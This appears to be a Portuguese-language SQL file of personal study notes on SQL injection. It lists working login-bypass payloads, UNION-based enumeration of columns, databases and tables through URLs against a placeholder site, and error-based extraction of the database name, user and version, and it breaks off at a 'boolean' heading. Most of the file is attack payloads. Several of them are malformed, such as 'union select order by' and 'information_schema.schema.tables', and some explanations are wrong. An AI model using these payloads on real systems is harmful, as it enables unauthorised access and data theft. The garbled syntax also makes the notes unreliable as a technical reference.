-- Injeção SQL
-- A injeção de SQL é uma técnica de injeção de código que pode destruir seu banco de dados.
-- A injeção de SQL é uma das técnicas mais comuns de hacking na web.
-- A injeção de SQL é a colocação de código malicioso em instruções SQL, por meio de entrada de página da web.

select * from Login where username = "admin" or "1"="1" and password = "admin" or "1"="1";
-- ele passa mesmo nao sendo usuário ou senha correto   sendo

select * from Login where username = "admin" or 1=1#" and password = "admin";
select * from Login where username = "admin" or 1=1/*" and password = "admin"; -- */ para fechar
select * from Login where username = "admin" or 1=1--" and password = "admin";
select * from Login where username = "admin" or 1=1-- -" and password = "admin";
-- # comentário depende da database ,depois quando console pede o ; ,ele ele também passa

select * from Login where username = "admin" or 1=1;--" and password = "admin";
-- evita o console pedir o ;

-- para input no site  o site poe esta usando "" ou '',
html input login ->     ' or 1=1#'
html input password ->  ' or 1=1#'
-- ele vai passar se o site nao tiver nem uma segurança

tipos de sql injection
in-band
    union - data based
    errors - errors based
inferential
    true/false - boolean based
    time - time based

-- union
select * from Login union select 1,2,3;
-- vai escrever no banco id=1,user=2,password=3, union vai funcionar se colocar corretamente
-- o números de tables corretamente

select * from Login union select database(),user(),version();
-- nome da database,root@localhost,versão da database

site -> https://site_aleatorio.com/union select database(),user(),version()
        https://site_aleatorio.com/union%20select%20database(),user(),version()

-- dependendo do site o numero de colunas nao da certo, ai podemos tentar força bruta
https://site_aleatorio.com/union%20select%201
https://site_aleatorio.com/union%20select%201,2
https://site_aleatorio.com/union%20select%201,2,3
-- ate achar o numero de colunas correto

-- outro jeito e achar mais facil o numero de colunas
https://site_aleatorio.com/union select order by 20 -- caso algum erro vai mudando os valores
https://site_aleatorio.com/union select order by 10 -- caso nem erro quer dizer que numero e colunas
--  é menor que 10 ou maior que 10

-- supostamente descobrimos que numero de colunas é 11:
https://site_aleatorio.com/union select order by 1,2,3,4,5,6,7,8,9,10,11

-- o site mostrou que somente a coluna 7,2,9 estão acessível
https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,version(),10,11

-- assim o site vai mostra o nome da database,o usuário e versão

-- para saber nome de outras databases
select schema_name from information_schema.schemata;
https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,schema_name,10,11 from information_schema.schemata
-- vai mostras todas database do site

select table_name from information_schema.schema.tables where table_schema ="nome da database";
-- retorna o nome da tabela no banco
https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,table_name,10,11 from information_schema.schema.tables  where table_schema ="nome da database"
https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,group_concat(table_name),10,11 from information_schema.schema.tables  where table_schema ="nome da database"
-- agrupa em um único grupo os nomes da tabela

-- error
select name from users group by round(rand(0)) having min(0);
-- duplicate key error em algumas database
select name,count(*) from users group by round(rand(0));

select name from users where name="sagar" or 1=1 group by round(rand(0)) having min(0);
https://site_aleatorio.com/or 1=1 group by round(rand(0)) having min(0)

select name,concat(version()," ",database()," ",user()," ",round(rand(0))) from users;
https://site_aleatorio.com/or 1=1 group by concat(version()," ",database()," ",user()," ",round(rand(0))) having min(0)
-- vai retornar versão,nome do banco, e usuário

-- boolean

